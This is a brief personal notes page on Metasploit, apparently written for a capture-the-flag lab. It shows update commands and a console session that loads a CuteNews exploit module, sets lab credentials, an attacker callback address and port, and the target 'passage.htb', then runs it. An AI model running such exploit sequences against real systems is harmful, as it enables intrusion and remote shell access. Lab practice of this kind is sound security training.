---
title: Meow's Testing Tools - Metasploit
date: 2019-09-17 11:11:11 -0400
categories: [10CyberAttack, CyberAttackTools]
tags: [CyberAttack, CyberAttackTools]
toc: true
image:
---


# Metasploit

[toc]

---

![Metasploit-help-command-1](https://i.imgur.com/NHCRDfW.jpg)

# bacis

```bash


# Updating Metasploit
apt-get update
apt-get upgrade
apt-get dist-upgrade
msfupdate


msfconsole
msf5 > searchsploit cutenews
msf5 > use php/webapps/46698.rb

# show you the available parameters for an exploit if used when the command line is in exploit context.
msf > show options

msf5 exploit(php/webapps/46698) > set lport 4444
lport => 4444
msf5 exploit(php/webapps/46698) > set password atlanta1
password => atlanta1
msf5 exploit(php/webapps/46698) > set username paul-coles
username => paul-coles
msf5 exploit(php/webapps/46698) > ifconfig
msf5 exploit(php/webapps/46698) > set lhost 10.10.15.74
lhost => 10.10.15.74
msf5 exploit(php/webapps/46698) > set rhosts passage.htb
rhosts => passage.htb

run


```






.
